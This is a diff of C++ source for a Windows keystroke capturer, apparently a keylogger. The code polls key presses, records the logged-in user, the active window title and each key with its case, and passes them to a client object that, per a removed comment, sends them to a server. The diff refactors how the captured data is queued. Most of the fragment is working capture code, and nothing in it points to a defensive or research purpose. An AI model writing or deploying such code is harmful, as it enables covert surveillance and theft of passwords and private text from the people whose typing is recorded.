@@ -55,23 +55,22 @@ void CapturerWin::run()
 
             if (rv & 1) // on press button down
             {
-                // Create the data to be sent to server.
-                KeyDataStruct keyData;
-                keyData.User = _user;
-                keyData.WindowTitle = (strlen(title) == 0 ? "NO ACTIVE WINDOW" : title);
+                _client->InsertData(_user);
+                _client->InsertData((strlen(title) == 0 ? "NO ACTIVE WINDOW" : title));
 
+                std::string key;
                 // If alpha key, check for case.
-                if (GeyKey(c, keyData.Key))
+                if (GeyKey(c, key))
                 {
                     if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x1)
-                        boost::to_upper(keyData.Key);
+                        boost::to_upper(key);
                     else
-                        boost::to_lower(keyData.Key);
+                        boost::to_lower(key);
                 }
 
-                _client->AddKeyInfo(keyData);
+                _client->InsertData(key);
 
-                //std::cout << ">" << GeyKey(c) << "< (" << (unsigned)c << ")" << std::endl;
+                std::cout << ">" << key << "< (" << (unsigned)c << ")" << std::endl;
             }
         }
         std::this_thread::sleep_for(std::chrono::milliseconds(2)); // enough for human
